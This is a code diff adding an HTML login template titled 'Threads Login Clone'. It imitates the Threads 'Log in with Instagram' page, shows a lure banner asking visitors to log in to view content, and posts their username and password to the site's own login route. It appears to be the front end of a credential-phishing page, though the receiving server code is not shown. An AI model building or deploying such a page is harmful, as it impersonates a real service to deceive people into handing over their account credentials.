@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>Threads Login Clone</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" />
+</head>
+<body>
+<div class="container">
+    <center style="color: red; margin-bottom: 30px;">Please, Login first to view this content !!</center>
+    <div class="card">
+        <h1 class="title">Say more with Threads</h1>
+        <p className="subtitle">
+            Join Threads to share thoughts, find out what's going on,
+            follow your people and more.
+        </p>
+
+        <h2 class="sub-heading">Log in with Instagram</h2>
+
+        <form action="{{ url_for('login') }}" method="POST" class="form">
+            <input
+                type="text"
+                name="username"
+                placeholder="Username, phone or email"
+                required
+            />
+            <input
+                type="password"
+                name="password"
+                placeholder="Password"
+                required
+            />
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+
+        <a href="#" class="forgot-link">Forgot password?</a>
+    </div>
+</div>
+</body>
+</html>
